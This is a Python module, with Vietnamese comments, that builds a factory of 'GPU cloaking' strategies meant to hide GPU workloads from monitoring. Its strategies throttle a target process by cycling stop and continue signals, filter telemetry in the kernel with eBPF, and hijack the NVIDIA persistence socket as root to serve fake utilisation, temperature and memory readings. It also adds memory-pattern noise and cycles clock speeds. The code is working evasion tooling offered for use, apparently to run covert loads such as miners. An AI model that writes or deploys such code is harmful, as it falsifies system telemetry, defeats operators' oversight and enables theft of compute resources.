#!/usr/bin/env python3
"""
Cloaking Strategy Factory - Module hóa và quản lý các kỹ thuật GPU cloaking

Factory pattern để tạo và quản lý các cloaking strategies:
- Time-based Evasion
- eBPF Telemetry Filter  
- Memory Pattern Obfuscation
- Process Namespace Isolation
- API Interception
- Dynamic SM Clock Throttling

Thiết kế module hóa cho phép dễ dàng thêm/bớt strategies và cấu hình linh hoạt.
"""

import os
import logging
import threading
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any, Type, cast
from enum import Enum
from dataclasses import dataclass, field
import subprocess
import random

# Import existing cloaking components
from ..gpu_plugins.cloaking.time_based_manager import GPUCloakingManager

# Import eBPF components if available
try:
    from ..gpu_plugins.ebpf.userspace.ebpf_manager import EBPFTelemetryFilter, is_ebpf_available
    # Import BCC_AVAILABLE from ebpf_manager to check real BCC availability
    from ..gpu_plugins.ebpf.userspace.ebpf_manager import BCC_AVAILABLE
    EBPF_AVAILABLE = True
except ImportError:
    EBPF_AVAILABLE = False
    BCC_AVAILABLE = False

logger = logging.getLogger(__name__)

class StrategyType(Enum):
    """Các loại cloaking strategy có sẵn"""
    TIME_BASED_EVASION = "time_based_evasion"
    EBPF_TELEMETRY_FILTER = "ebpf_telemetry_filter"
    MEMORY_PATTERN_OBFUSCATION = "memory_pattern_obfuscation"
    PROCESS_NAMESPACE_ISOLATION = "process_namespace_isolation"
    API_INTERCEPTION = "api_interception"
    NVML_IPC_HIJACKING = "nvml_ipc_hijacking"
    DYNAMIC_SM_CLOCK_THROTTLING = "dynamic_sm_clock_throttling"

class StrategyPriority(Enum):
    """Mức độ ưu tiên của strategies"""
    CRITICAL = 1    # Kernel-level (eBPF)
    HIGH = 2        # Process-level (Namespace, Time-based)
    MEDIUM = 3      # Memory-level (MPO)
    LOW = 4         # User-space (API hooks)

@dataclass
class StrategyConfig:
    """Cấu hình cho một cloaking strategy"""
    enabled: bool = True
    priority: StrategyPriority = StrategyPriority.MEDIUM
    config: Dict[str, Any] = field(default_factory=dict)
    dependencies: List[str] = field(default_factory=list)

class CloakingStrategy(ABC):
    """Abstract base class cho tất cả cloaking strategies"""
    
    def __init__(self, config: StrategyConfig):
        self.config = config
        self.running = False
        self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
    
    @abstractmethod
    def start(self) -> bool:
        """Khởi động strategy. Return True nếu thành công."""
        pass
    
    @abstractmethod
    def stop(self):
        """Dừng strategy."""
        pass
    
    @abstractmethod
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái hiện tại của strategy."""
        pass
    
    @property
    @abstractmethod
    def strategy_type(self) -> StrategyType:
        """Loại strategy."""
        pass
    
    def is_available(self) -> bool:
        """Kiểm tra xem strategy có khả dụng không."""
        return True
    
    def check_dependencies(self) -> bool:
        """Kiểm tra dependencies của strategy."""
        return True

class TimeBasedEvasionStrategy(CloakingStrategy):
    """Time-based Evasion Strategy - SIGSTOP/SIGCONT cycling"""
    
    def __init__(self, config: StrategyConfig, target_pid: int):
        super().__init__(config)
        self.target_pid = target_pid
        self.gpu_cloaking_manager: Optional[GPUCloakingManager] = None
    
    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.TIME_BASED_EVASION
    
    def start(self) -> bool:
        try:
            work_ms = self.config.config.get('work_ms', 800)
            sleep_ms = self.config.config.get('sleep_ms', 200)
            
            self.gpu_cloaking_manager = GPUCloakingManager(
                target_pid=self.target_pid,
                work_ms=work_ms,
                sleep_ms=sleep_ms
            )
            
            self.gpu_cloaking_manager.start()
            self.running = True
            self.logger.info("✅ Time-based Evasion started")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start Time-based Evasion: {e}")
            return False
    
    def stop(self):
        if self.gpu_cloaking_manager:
            self.gpu_cloaking_manager.stop()
            self.gpu_cloaking_manager = None
        self.running = False
        self.logger.info("🛑 Time-based Evasion stopped")
    
    def get_status(self) -> Dict[str, Any]:
        status = {
            'type': self.strategy_type.value,
            'running': self.running,
            'target_pid': self.target_pid
        }
        
        if self.gpu_cloaking_manager:
            status.update(self.gpu_cloaking_manager.get_status())
        
        return status

class EBPFTelemetryFilterStrategy(CloakingStrategy):
    """eBPF Telemetry Filter Strategy - Kernel-level interception"""
    
    def __init__(self, config: StrategyConfig):
        super().__init__(config)
        self.ebpf_filter: Optional[EBPFTelemetryFilter] = None
    
    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.EBPF_TELEMETRY_FILTER
    
    def is_available(self) -> bool:
        # Always return True since we have mock mode fallback
        return is_ebpf_available()
    
    def check_dependencies(self) -> bool:
        if not BCC_AVAILABLE:
            self.logger.info("🔧 BCC not available - using mock mode")
            # In mock mode, don't require root privileges
            return True
        
        # Check for root privileges only in real eBPF mode
        if os.geteuid() != 0:
            self.logger.warning("⚠️ Root privileges required for eBPF")
            return False
        
        return True
    
    def start(self) -> bool:
        if not self.check_dependencies():
            return False
            
        try:
            config_path = self.config.config.get('config_path')
            self.ebpf_filter = EBPFTelemetryFilter(config_path)
            
            if self.ebpf_filter.start_filtering():
                self.running = True
                self.logger.info("✅ eBPF Telemetry Filter started")
                return True
            else:
                self.logger.error("❌ Failed to start eBPF filtering")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ Failed to start eBPF filter: {e}")
            return False
    
    def stop(self):
        if self.ebpf_filter:
            self.ebpf_filter.stop_filtering()
            self.ebpf_filter = None
        self.running = False
        self.logger.info("🛑 eBPF Telemetry Filter stopped")
    
    def get_status(self) -> Dict[str, Any]:
        status = {
            'type': self.strategy_type.value,
            'running': self.running,
            'available': self.is_available()
        }
        
        if self.ebpf_filter:
            status.update(self.ebpf_filter.get_status())
        
        return status

class MemoryPatternObfuscationStrategy(CloakingStrategy):
    """Memory Pattern Obfuscation Strategy - CUDA memory noise"""
    
    def __init__(self, config: StrategyConfig):
        super().__init__(config)
        self.mpo_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
    
    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.MEMORY_PATTERN_OBFUSCATION
    
    def is_available(self) -> bool:
        try:
            import ctypes
            lib_path = self.config.config.get('lib_path', '/opt/mpo/libmpo.so')
            return os.path.exists(lib_path)
        except ImportError:
            return False
    
    def start(self) -> bool:
        if not self.is_available():
            self.logger.warning("⚠️ MPO library not available")
            return False
            
        try:
            import ctypes
            lib_path = self.config.config.get('lib_path', '/opt/mpo/libmpo.so')
            
            def run_mpo():
                try:
                    lib = ctypes.CDLL(lib_path)
                    if hasattr(lib, 'launch_mpo_kernel'):
                        lib.launch_mpo_kernel.restype = None
                        lib.launch_mpo_kernel()
                        self.logger.info("✅ MPO kernel launched")
                    else:
                        self.logger.warning("⚠️ MPO library missing launch_mpo_kernel function")
                except Exception as e:
                    self.logger.error(f"❌ MPO execution error: {e}")
            
            self.mpo_thread = threading.Thread(target=run_mpo, daemon=True)
            self.mpo_thread.start()
            self.running = True
            self.logger.info("✅ Memory Pattern Obfuscation started")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start MPO: {e}")
            return False
    
    def stop(self):
        self.stop_event.set()
        if self.mpo_thread and self.mpo_thread.is_alive():
            self.mpo_thread.join(timeout=2)
        self.running = False
        self.logger.info("🛑 Memory Pattern Obfuscation stopped")
    
    def get_status(self) -> Dict[str, Any]:
        return {
            'type': self.strategy_type.value,
            'running': self.running,
            'available': self.is_available(),
            'thread_alive': self.mpo_thread.is_alive() if self.mpo_thread else False
        }

class ProcessNamespaceIsolationStrategy(CloakingStrategy):
    """Process Namespace Isolation Strategy - unshare namespaces"""
    
    def __init__(self, config: StrategyConfig):
        super().__init__(config)
        self.isolation_active = False
    
    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.PROCESS_NAMESPACE_ISOLATION
    
    def is_available(self) -> bool:
        # Check if unshare command is available
        try:
            import subprocess
            result = subprocess.run(['which', 'unshare'], capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def start(self) -> bool:
        # This strategy is typically applied at process launch time
        # Here we just mark it as active for status tracking
        if self.is_available():
            self.isolation_active = True
            self.running = True
            self.logger.info("✅ Process Namespace Isolation marked as active")
            return True
        else:
            self.logger.warning("⚠️ unshare command not available")
            return False
    
    def stop(self):
        self.isolation_active = False
        self.running = False
        self.logger.info("🛑 Process Namespace Isolation deactivated")
    
    def get_status(self) -> Dict[str, Any]:
        return {
            'type': self.strategy_type.value,
            'running': self.running,
            'available': self.is_available(),
            'isolation_active': self.isolation_active
        }

class NVMLIPCHijackingStrategy(CloakingStrategy):
    """NVML IPC Hijacking Strategy - Proxy và sửa response NVML"""
    
    def __init__(self, config: StrategyConfig):
        super().__init__(config)
        self.proxy_process = None
        
    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.NVML_IPC_HIJACKING
        
    def is_available(self) -> bool:
        # Kiểm tra socket NVML tồn tại
        return os.path.exists("/var/run/nvidia-persistenced/socket")
        
    def check_dependencies(self) -> bool:
        # Cần quyền root để bind socket
        if os.geteuid() != 0:
            self.logger.warning("⚠️ Root privileges required for NVML IPC Hijacking")
            return False
        return True
        
    def start(self) -> bool:
        if not self.check_dependencies():
            return False
            
        # Nếu có privileged_manager (đã inject), thực hiện hijack trước
        if hasattr(self, 'privileged_manager') and cast(Any, self).privileged_manager:
            pm = cast(Any, self).privileged_manager
            if not pm.hijack_nvml_socket():
                self.logger.warning("⚠️ Hijack NVML socket failed, proxy may not work")
        
        try:
            import subprocess
            # Khởi động proxy daemon
            proxy_script = os.path.join(
                os.path.dirname(__file__), 
                "../gpu_plugins/ipc/nvml_proxy/nvml_proxy_daemon.py"
            )
            
            # Kiểm tra script tồn tại
            if not os.path.exists(proxy_script):
                self.logger.error(f"❌ Proxy script not found: {proxy_script}")
                return False
            
            # Thiết lập environment cho proxy
            env = os.environ.copy()
            env.update({
                'NVML_FAKE_UTIL': str(self.config.config.get('fake_util', 0)),
                'NVML_FAKE_TEMP': str(self.config.config.get('fake_temp', 50)),
                'NVML_FAKE_MEM_MB': str(self.config.config.get('fake_mem_mb', 100)),
                'NVML_ADD_NOISE': str(self.config.config.get('add_noise', 0))
            })
            
            self.proxy_process = subprocess.Popen(
                ["python3", proxy_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env
            )
            
            # Đợi proxy khởi động
            import time
            time.sleep(2)
            
            # Kiểm tra proxy còn chạy
            if self.proxy_process.poll() is not None:
                stdout, stderr = self.proxy_process.communicate()
                self.logger.error(f"❌ Proxy exited early. Stdout: {stdout.decode()}, Stderr: {stderr.decode()}")
                return False
            
            self.running = True
            self.logger.info("✅ NVML IPC Hijacking started")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start NVML proxy: {e}")
            return False
            
    def stop(self):
        if self.proxy_process:
            self.proxy_process.terminate()
            try:
                self.proxy_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proxy_process.kill()
            self.proxy_process = None
            
        self.running = False
        self.logger.info("🛑 NVML IPC Hijacking stopped")
        
    def get_status(self) -> Dict[str, Any]:
        return {
            'type': self.strategy_type.value,
            'running': self.running,
            'available': self.is_available(),
            'proxy_pid': self.proxy_process.pid if self.proxy_process else None,
            'proxy_alive': self.proxy_process.poll() is None if self.proxy_process else False
        }

class DynamicSMClockThrottlingStrategy(CloakingStrategy):
    """Dynamic SM Clock Throttling – lock/unlock GPU clocks theo chu kỳ"""

    def __init__(self, config: StrategyConfig):
        super().__init__(config)
        from .clock_throttler import ClockThrottler
        self.stop_event = threading.Event()
        self.throttler: Optional[ClockThrottler] = None

    @property
    def strategy_type(self) -> StrategyType:
        return StrategyType.DYNAMIC_SM_CLOCK_THROTTLING

    def is_available(self) -> bool:
        return subprocess.run(["which", "nvidia-smi"], capture_output=True).returncode == 0

    def start(self) -> bool:
        if not self.is_available():
            self.logger.warning("nvidia-smi not found – skip SM clock throttling")
            return False
        try:
            from .clock_throttler import ClockThrottler
            low = int(self.config.config.get('clock_low', 300))
            high = int(self.config.config.get('clock_high', 1200))
            interval = int(self.config.config.get('interval', 30))

            self.throttler = ClockThrottler(clock_low=low, clock_high=high, interval=interval, stop_event=self.stop_event)
            self.throttler.start()
            self.running = True
            self.logger.info("✅ Dynamic SM Clock Throttling started")
            return True
        except Exception as exc:
            self.logger.error(f"Failed to start SM clock throttling: {exc}")
            return False

    def stop(self):
        if self.throttler:
            self.throttler.stop()
            self.throttler.join(timeout=2)
            self.throttler = None
        self.running = False
        self.logger.info("🛑 Dynamic SM Clock Throttling stopped")

    def get_status(self) -> Dict[str, Any]:
        return {
            'type': self.strategy_type.value,
            'running': self.running,
            'available': self.is_available()
        }

class CloakingStrategyFactory:
    """Factory để tạo và quản lý các cloaking strategies"""
    
    # Registry của các strategy classes
    _strategy_classes: Dict[StrategyType, Type[CloakingStrategy]] = {
        StrategyType.TIME_BASED_EVASION: TimeBasedEvasionStrategy,
        StrategyType.EBPF_TELEMETRY_FILTER: EBPFTelemetryFilterStrategy,
        StrategyType.MEMORY_PATTERN_OBFUSCATION: MemoryPatternObfuscationStrategy,
        StrategyType.PROCESS_NAMESPACE_ISOLATION: ProcessNamespaceIsolationStrategy,
        StrategyType.NVML_IPC_HIJACKING: NVMLIPCHijackingStrategy,
        StrategyType.DYNAMIC_SM_CLOCK_THROTTLING: DynamicSMClockThrottlingStrategy,
    }
    
    def __init__(self):
        self.active_strategies: Dict[StrategyType, CloakingStrategy] = {}
        self.logger = logging.getLogger(__name__)
    
    @classmethod
    def register_strategy(cls, strategy_type: StrategyType, strategy_class: Type[CloakingStrategy]):
        """Đăng ký một strategy class mới"""
        cls._strategy_classes[strategy_type] = strategy_class
    
    def create_strategy(self, strategy_type: StrategyType, config: StrategyConfig, 
                       **kwargs) -> Optional[CloakingStrategy]:
        """Tạo một strategy instance"""
        if strategy_type not in self._strategy_classes:
            self.logger.error(f"❌ Unknown strategy type: {strategy_type}")
            return None
        
        strategy_class = self._strategy_classes[strategy_type]
        
        try:
            # Special handling for strategies that need additional parameters
            if strategy_type == StrategyType.TIME_BASED_EVASION:
                target_pid = kwargs.get('target_pid')
                if target_pid is None:
                    self.logger.error("❌ target_pid required for Time-based Evasion")
                    return None
                return strategy_class(config, target_pid)  # type: ignore[arg-type]
            else:
                return strategy_class(config)
                
        except Exception as e:
            self.logger.error(f"❌ Failed to create strategy {strategy_type}: {e}")
            return None
    
    def start_strategy(self, strategy_type: StrategyType, config: StrategyConfig, 
                      **kwargs) -> bool:
        """Khởi động một strategy"""
        if strategy_type in self.active_strategies:
            self.logger.warning(f"⚠️ Strategy {strategy_type} already active")
            return True
        
        strategy = self.create_strategy(strategy_type, config, **kwargs)
        if strategy is None:
            return False
        
        # Inject privileged_manager (nếu truyền) vào strategy
        pm = kwargs.get('privileged_manager')
        if pm and hasattr(strategy, 'set_privileged_manager'):
            cast(Any, strategy).set_privileged_manager(pm)
        
        if not strategy.is_available():
            self.logger.warning(f"⚠️ Strategy {strategy_type} not available")
            return False
        
        if strategy.start():
            self.active_strategies[strategy_type] = strategy
            self.logger.info(f"✅ Started strategy: {strategy_type.value}")
            return True
        else:
            self.logger.error(f"❌ Failed to start strategy: {strategy_type.value}")
            return False
    
    def stop_strategy(self, strategy_type: StrategyType):
        """Dừng một strategy"""
        if strategy_type not in self.active_strategies:
            self.logger.warning(f"⚠️ Strategy {strategy_type} not active")
            return
        
        strategy = self.active_strategies[strategy_type]
        strategy.stop()
        del self.active_strategies[strategy_type]
        self.logger.info(f"🛑 Stopped strategy: {strategy_type.value}")
    
    def stop_all_strategies(self):
        """Dừng tất cả strategies"""
        for strategy_type in list(self.active_strategies.keys()):
            self.stop_strategy(strategy_type)
        self.logger.info("🛑 All strategies stopped")
    
    def get_strategy_status(self, strategy_type: StrategyType) -> Optional[Dict[str, Any]]:
        """Lấy trạng thái của một strategy"""
        if strategy_type not in self.active_strategies:
            return None
        return self.active_strategies[strategy_type].get_status()
    
    def get_all_status(self) -> Dict[str, Any]:
        """Lấy trạng thái của tất cả strategies"""
        status = {
            'active_strategies': list(self.active_strategies.keys()),
            'total_active': len(self.active_strategies),
            'strategies': {}
        }
        
        for strategy_type, strategy in self.active_strategies.items():
            status['strategies'][strategy_type.value] = strategy.get_status()
        
        return status
    
    def get_available_strategies(self) -> List[StrategyType]:
        """Lấy danh sách các strategies có sẵn"""
        available = []
        for strategy_type, strategy_class in self._strategy_classes.items():
            # Create temporary instance to check availability
            try:
                temp_config = StrategyConfig()
                if strategy_type == StrategyType.TIME_BASED_EVASION:
                    temp_strategy = strategy_class(temp_config, 1)  # type: ignore[arg-type]  # dummy PID
                else:
                    temp_strategy = strategy_class(temp_config)
                
                if temp_strategy.is_available():
                    available.append(strategy_type)
            except:
                pass  # Strategy not available
        
        return available

# Convenience function để tạo factory instance
def create_cloaking_factory() -> CloakingStrategyFactory:
    """Tạo CloakingStrategyFactory instance"""
    return CloakingStrategyFactory()

# Default configuration cho các strategies
DEFAULT_STRATEGY_CONFIGS = {
    StrategyType.TIME_BASED_EVASION: StrategyConfig(
        enabled=True,
        priority=StrategyPriority.HIGH,
        config={
            'work_ms': int(os.getenv('WORK_MS', 800)),
            'sleep_ms': int(os.getenv('SLEEP_MS', 200))
        }
    ),
    StrategyType.EBPF_TELEMETRY_FILTER: StrategyConfig(
        enabled=os.getenv('ENABLE_EBPF_CLOAK', '0') == '1',
        priority=StrategyPriority.CRITICAL,
        config={
            'config_path': os.getenv('EBPF_CONFIG_PATH')
        },
        dependencies=['root_privileges', 'bcc']
    ),
    StrategyType.MEMORY_PATTERN_OBFUSCATION: StrategyConfig(
        enabled=os.getenv('ENABLE_MPO', '0') == '1',
        priority=StrategyPriority.MEDIUM,
        config={
            'lib_path': os.getenv('MPO_LIB', '/opt/mpo/libmpo.so')
        },
        dependencies=['cuda', 'libmpo']
    ),
    StrategyType.PROCESS_NAMESPACE_ISOLATION: StrategyConfig(
        enabled=os.getenv('ENABLE_NS_ISOLATION', '0') == '1',
        priority=StrategyPriority.HIGH,
        config={
            'use_pid_ns': True,
            'use_mount_ns': True,
            'use_net_ns': os.getenv('NS_USE_NET', '1') == '1'
        },
        dependencies=['unshare']
    ),
    StrategyType.NVML_IPC_HIJACKING: StrategyConfig(
        enabled=os.getenv('ENABLE_NVML_IPC_HIJACKING', '0') == '1',
        priority=StrategyPriority.CRITICAL,
        config={
            'fake_util': int(os.getenv('NVML_FAKE_UTIL', 0)),
            'fake_temp': int(os.getenv('NVML_FAKE_TEMP', 50)),
            'fake_mem_mb': int(os.getenv('NVML_FAKE_MEM_MB', 100)),
            'add_noise': int(os.getenv('NVML_ADD_NOISE', 0))
        },
        dependencies=['root_privileges']
    ),
    StrategyType.DYNAMIC_SM_CLOCK_THROTTLING: StrategyConfig(
        enabled=os.getenv('ENABLE_SM_THROTTLE', '0') == '1',
        priority=StrategyPriority.MEDIUM,
        config={
            'clock_low': int(os.getenv('CLOCK_LOW', 300)),
            'clock_high': int(os.getenv('CLOCK_HIGH', 1200)),
            'interval': int(os.getenv('THROTTLE_INTERVAL', 30))
        },
        dependencies=['nvidia-smi']
    ),
}

if __name__ == "__main__":
    # Test the factory
    logging.basicConfig(level=logging.INFO)
    
    factory = create_cloaking_factory()
    
    print("Available strategies:")
    for strategy_type in factory.get_available_strategies():
        print(f"  - {strategy_type.value}")
    
    print("\nFactory ready for use.")
 